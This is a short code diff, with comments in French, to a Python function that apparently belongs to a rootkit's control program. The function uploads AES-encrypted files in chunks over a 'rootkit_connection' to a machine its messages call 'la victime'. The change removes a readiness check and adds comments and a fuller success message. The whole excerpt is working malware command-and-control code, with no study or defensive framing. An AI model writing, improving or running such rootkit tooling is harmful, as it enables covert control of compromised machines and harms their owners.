@@ -179,12 +179,10 @@ def upload_file_encrypted(local_path, remote_path):
         return
 
     try:
+        # Envoi de la commande upload + chemin destination
         send_to_server(rootkit_connection, f"upload {remote_path}")
-        ack = rootkit_connection.recv(1024).decode()
-        if ack.strip() != "READY_TO_RECEIVE":
-            print("[!] La victime n'est pas prête.")
-            return
 
+        # Envoi du fichier chiffré par blocs
         with open(local_path, "rb") as f:
             while True:
                 chunk = f.read(4096)
@@ -193,8 +191,10 @@ def upload_file_encrypted(local_path, remote_path):
                 encrypted = aes_encrypt(chunk)
                 rootkit_connection.sendall(encrypted)
 
+        # Marqueur de fin
         rootkit_connection.sendall(b"EOF\n")
-        print(f"[+] Fichier '{local_path}' envoyé avec succès.")
+
+        print(f"[+] Fichier '{local_path}' envoyé avec succès vers '{remote_path}'.")
 
     except Exception as e:
         print(f"[!] Erreur d'envoi : {e}")
